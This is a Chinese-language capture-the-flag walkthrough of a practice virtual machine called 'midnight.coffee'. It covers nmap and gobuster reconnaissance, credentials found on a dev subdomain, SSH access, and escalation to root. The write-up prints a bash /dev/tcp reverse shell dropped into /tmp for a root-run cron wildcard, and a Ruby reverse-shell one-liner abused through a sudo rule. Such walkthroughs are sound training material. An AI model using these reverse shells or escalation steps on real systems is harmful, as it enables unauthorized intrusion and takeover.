# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.2.0/24 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-10 03:21 EDT
Nmap scan report for christmas.hmv (192.168.2.5)
Host is up (0.00038s latency).
MAC Address: 08:00:27:2A:FE:97 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for kali (192.168.2.15)
Host is up.
Nmap done: 256 IP addresses (7 hosts up) scanned in 2.57 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.2.5 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-10 03:23 EDT
Nmap scan report for christmas.hmv (192.168.2.5)
Host is up (0.00037s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 81:a4:52:2b:14:3f:13:68:2b:e2:5b:c4:7b:d7:1a:a5 (ECDSA)
|_  256 25:19:09:29:2f:b8:ea:b4:29:1f:6d:e7:13:d6:be:7e (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Under Construction - Midnight Coffee
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 08:00:27:2A:FE:97 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.37 ms christmas.hmv (192.168.2.5)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.02 seconds
```

# 漏洞利用

根据80端口提示，绑定一下域名：Our website "midnight.coffee" is under Construction

```
┌──(kali㉿kali)-[~]
└─$ sudo sed -i '/192.168.2.5/d' /etc/hosts && echo "192.168.2.5 midnight.coffee" | sudo tee -a /etc/hosts
192.168.2.5 midnight.coffee
```

目录扫描和子域名爆破

```
┌──(kali㉿kali)-[~]
└─$ gobuster vhost -w SecLists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -u http://midnight.coffee/
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://midnight.coffee/
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.midnight.coffee Status: 200 [Size: 1738]
Progress: 114442 / 114443 (100.00%)
===============================================================
Finished
===============================================================
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt,jpg,png,zip,git -u http://midnight.coffee
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://midnight.coffee
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              png,zip,git,html,php,txt,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/.php                 (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 1690]
/shop                 (Status: 301) [Size: 317] [--> http://midnight.coffee/shop/]                                                        
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/server-status        (Status: 403) [Size: 280]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 280]
Progress: 8200650 / 9482040 (86.49%)[ERROR] Get "http://midnight.coffee/0596009488.zip": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt,jpg,png,zip,git -u http://midnight.coffee/shop
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://midnight.coffee/shop
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,jpg,png,zip,git,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 2577]
/.php                 (Status: 403) [Size: 280]
/login.php            (Status: 200) [Size: 1202]
/dashboard.php        (Status: 302) [Size: 0] [--> login.php]
/.html                (Status: 403) [Size: 280]
/.php                 (Status: 403) [Size: 280]
/stylesheet           (Status: 301) [Size: 328] [--> http://midnight.coffee/shop/stylesheet/]                                             
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 280]
Progress: 7818460 / 9482040 (82.46%)[ERROR] Get "http://midnight.coffee/shop/cover_right.png": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

找到了一个登录页面，和一个子域名

```
┌──(kali㉿kali)-[~]
└─$ echo "192.168.2.5 dev.midnight.coffee" | sudo tee -a /etc/hosts
[sudo] password for kali: 
192.168.2.5 dev.midnight.coffee
┌──(kali㉿kali)-[~]
└─$ curl http://dev.midnight.coffee/
<p>Username: <strong>developer</strong></p>
<p>Password: <strong>developer</strong></p>
```

尝试登录页面登录

```
Welcome to the Dashboard, developer!
To login into the server use: tuna : 1L0v3_TuN4_Very_Much
```

ssh登录

```
┌──(kali㉿kali)-[~]
└─$ ssh tuna@192.168.2.5                                        
The authenticity of host '192.168.2.5 (192.168.2.5)' can't be established.
ED25519 key fingerprint is SHA256:BDdxu8eqrB8nO8JfJ3LfRnnT0gGHmaYMEIA1SfgIR6g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.2.5' (ED25519) to the list of known hosts.
tuna@192.168.2.5's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Apr 10 09:04:30 AM UTC 2026

  System load:  0.01220703125      Processes:               132
  Usage of /:   83.8% of 14.01GB   Users logged in:         0
  Memory usage: 48%                IPv4 address for enp0s3: 192.168.2.5
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

41 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Jan  3 18:49:19 2024 from 10.0.2.8
tuna@coffee-shop:~$ id
uid=1002(tuna) gid=1002(tuna) groups=1002(tuna)
```

# 权限提升

```
tuna@coffee-shop:~$ whoami;id;hostname;uname -a
tuna
uid=1002(tuna) gid=1002(tuna) groups=1002(tuna)
coffee-shop
Linux coffee-shop 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
tuna@coffee-shop:~$ sudo -l
[sudo] password for tuna: 
Sorry, user tuna may not run sudo on coffee-shop.
//查看历史命令，发现vim /etc/crontab和访问/home/shopadmin/execute.sh记录
tuna@coffee-shop:~$ cat ~/.bash_history
ls
touch coffee_list.txt
vim coffee_list.txt 
head coffee_list.txt 
vim coffee_list.txt 
mv coffee_list.txt unavailable.txt
ls
head unavailable.txt 
tail unavailable.txt 
mv unavailable.txt available.txt
exit
ls
cd
ls
cat available.txt 
rm available.txt 
vim available.txt
ls
chmod 777 available.txt 
exit
ls
cd
ls
cat available.txt 
chmod 777 available.txt 
ls
ls -la
chmod a+r available.txt 
ls -la
exit
cd
ls
ls -la
ls
cat available.txt 
ls
rm available.txt 
ls
exit
ls
cd
ls
vim unavailable.sh
bash unavailable.sh 
exit
cd
ls
rm unavailable.sh 
exit
ls
cd
ls
vim /etc/crontab
exit
ls
cd
ls
cd /tmp
ls
vim uwu.sh
chmod +x uwu.sh 
#
ls
vim uwu.sh 
ls
chmod +x uwu.sh 
rm uwu.sh 
ls
cd
ls
exit
ls
cd
ls
cat /home/shopadmin/
cat /home/shopadmin/execute.sh
exit
cat /home/shopadmin/execute.sh
exit
cat /home/shopadmin/execute.sh
cd
ls
exit
tuna@coffee-shop:~$ ls -la /home/shopadmin/execute.sh
-rwxrwxr-x 1 shopadmin shopadmin 33 Jan  3  2024 /home/shopadmin/execute.sh             
///tmp全局可写，通配符*会执行该目录下所有.sh 文件，只需在/tmp放一个反弹shell脚本，就会被自动执行                                           
tuna@coffee-shop:~$ cat /home/shopadmin/execute.sh#!/bin/bash

/bin/bash /tmp/*.sh
//每分钟执行该脚本
tuna@coffee-shop:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * /bin/bash /home/shopadmin/execute.sh
tuna@coffee-shop:~$ echo 'bash -i >& /dev/tcp/192.168.2.15/4444 0>&1' > /tmp/shell.sh
tuna@coffee-shop:~$ chmod +x /tmp/shell.sh
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.2.15] from (UNKNOWN) [192.168.2.5] 45948
bash: cannot set terminal process group (2577): Inappropriate ioctl for device
bash: no job control in this shell
shopadmin@coffee-shop:~$ id
id
uid=1001(shopadmin) gid=1001(shopadmin) groups=1001(shopadmin)
//意思是可以免密码用权限执行/usr/bin/ruby，且命令中必须包含/opt/shop.rb，但*可以匹配任意参数
shopadmin@coffee-shop:~$ sudo -l
sudo -l
Matching Defaults entries for shopadmin on coffee-shop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User shopadmin may run the following commands on coffee-shop:
    (root) NOPASSWD: /usr/bin/ruby * /opt/shop.rb
//Ruby的-e参数可以直接执行一行代码。
shopadmin@coffee-shop:~$ sudo /usr/bin/ruby -e 'require "socket"; exit if fork; c=TCPSocket.new("192.168.2.15","5555"); while(cmd=c.gets); IO.popen(cmd,"r"){|io|c.print io.read} end' /opt/shop.rb
<pen(cmd,"r"){|io|c.print io.read} end' /opt/shop.rb
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [192.168.2.15] from (UNKNOWN) [192.168.2.5] 48096
id
uid=0(root) gid=0(root) groups=0(root)
```
